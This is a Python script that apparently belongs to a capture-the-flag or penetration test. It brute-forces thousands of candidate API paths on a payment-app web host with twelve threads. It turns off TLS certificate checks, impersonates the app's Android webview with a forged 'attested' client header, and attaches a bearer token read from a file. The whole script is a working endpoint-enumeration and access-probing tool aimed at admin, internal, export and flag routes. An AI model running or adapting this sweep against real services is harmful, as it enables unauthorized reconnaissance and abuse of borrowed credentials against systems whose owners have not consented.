import json, ssl, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor
BASE="https://web-3f25599ac74e8a91.web.h7tex.com"
CTX=ssl.create_default_context();CTX.check_hostname=False;CTX.verify_mode=ssl.CERT_NONE
WV={"User-Agent":"Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TD1A.230804.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9",
    "X-Requested-With":"com.meridian.pay","Sec-Fetch-Mode":"navigate","Sec-Fetch-Dest":"document",
    "Sec-Fetch-Site":"none","Upgrade-Insecure-Requests":"1","X-Meridian-Client":"MeridianPay-Android/3.2.1 (attested)"}
def call(p,t=None,m="GET"):
    hh=dict(WV)
    if t:hh["Authorization"]="Bearer "+t
    r=urllib.request.Request(BASE+p,method=m,headers=hh)
    try:
        with urllib.request.urlopen(r,context=CTX,timeout=10) as f:return f.status,f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:return e.code,e.read().decode("utf-8","replace")
    except Exception as e:return None,repr(e)
T=open("T3.txt").read().strip()
NOUN=open("nouns.txt").read().split()
TAIL=["/me","/flag","/export","/1001","/1","/current","/all"]
PRE=["/","/api/","/api/v1/","/api/v1/internal/","/api/v1/admin/","/api/v1/auth/","/api/v1/accounts/","/api/v1/promo/","/v1/","/internal/","/admin/","/mobile/"]
paths=set()
for pre in PRE:
    for n in NOUN:
        paths.add(pre+n)
        if pre in ("/api/v1/","/api/v1/admin/","/api/v1/internal/","/api/v1/accounts/"):
            for tl in TAIL[:4]: paths.add(pre+n+tl)
paths=sorted(paths); print("paths",len(paths),flush=True)
def work(p):
    c,b=call(p,T)
    if not (c==404 and "404 Not Found" in b): return (p,c,b[:200])
    return None
with ThreadPoolExecutor(max_workers=12) as ex:
    for i,r in enumerate(ex.map(work,paths)):
        if r: print("HIT",r,flush=True)
        if i%2000==0: print("...",i,flush=True)
print("WV-SWEEP DONE")
